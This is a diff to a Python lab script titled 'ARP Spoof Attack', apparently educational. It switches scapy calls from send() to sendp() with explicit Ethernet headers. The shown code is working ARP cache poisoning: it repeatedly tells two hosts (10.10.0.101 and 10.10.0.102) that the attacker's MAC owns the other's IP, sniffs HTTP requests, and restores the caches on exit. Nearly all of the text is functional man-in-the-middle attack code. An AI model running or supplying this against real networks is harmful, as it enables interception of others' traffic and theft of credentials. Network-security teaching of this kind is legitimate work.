@@ -8,10 +8,12 @@ Lab - ARP Spoof Attack
 (CC BY-SA 4.0) github.com/moospit
 """
 
-from scapy.all import ARP, send, AsyncSniffer, Packet, Raw
+from scapy.all import ARP, Ether, sendp, AsyncSniffer, Packet, Raw
 from scapy.layers.http import HTTPRequest
 import logging
 import time
+
+IFACE = 'eth0'  # the inferface we want to use
 
 # supress scapy import warnings
 logging.getLogger('scapy.runtime').setLevel(logging.ERROR)
@@ -39,10 +41,12 @@ def main() -> None:
         sniff.start()
         print('[>] Starting poisoning')
         while True:
-            send(ARP(op='is-at', pdst='10.10.0.101', hwdst='00:00:00:00:00:01',
-                 psrc='10.10.0.102', hwsrc='00:00:00:00:00:03'), verbose=False)
-            send(ARP(op='is-at', pdst='10.10.0.102', hwdst='00:00:00:00:00:02',
-                 psrc='10.10.0.101', hwsrc='00:00:00:00:00:03'), verbose=False)
+            sendp(Ether(dst='00:00:00:00:00:01')/ARP(
+                op='is-at', pdst='10.10.0.101', hwdst='00:00:00:00:00:01',
+                psrc='10.10.0.102', hwsrc='00:00:00:00:00:03'), verbose=False)
+            sendp(Ether(dst='00:00:00:00:00:02')/ARP(
+                op='is-at', pdst='10.10.0.102', hwdst='00:00:00:00:00:02',
+                psrc='10.10.0.101', hwsrc='00:00:00:00:00:03'), verbose=False)
             time.sleep(1)  # don't flood the network
     except KeyboardInterrupt:
         print('\n[>] Got keyboard interrupt')
@@ -50,10 +54,12 @@ def main() -> None:
 
     # clean up victim's arp caches
     print('[>] Cleaning up')
-    send(ARP(op='is-at', pdst='10.10.0.101', hwdst='00:00:00:00:00:01',
-             psrc='10.10.0.102', hwsrc='00:00:00:00:00:02'), verbose=False)
-    send(ARP(op='is-at', pdst='10.10.0.102', hwdst='00:00:00:00:00:02',
-             psrc='10.10.0.101', hwsrc='00:00:00:00:00:01'), verbose=False)
+    sendp(Ether(dst='00:00:00:00:00:01')/ARP(
+        op='is-at', pdst='10.10.0.101', hwdst='00:00:00:00:00:01',
+        psrc='10.10.0.102', hwsrc='00:00:00:00:00:02'), verbose=False)
+    sendp(Ether(dst='00:00:00:00:00:02')/ARP(
+        op='is-at', pdst='10.10.0.102', hwdst='00:00:00:00:00:02',
+        psrc='10.10.0.101', hwsrc='00:00:00:00:00:01'), verbose=False)
 
 
 if __name__ == '__main__':
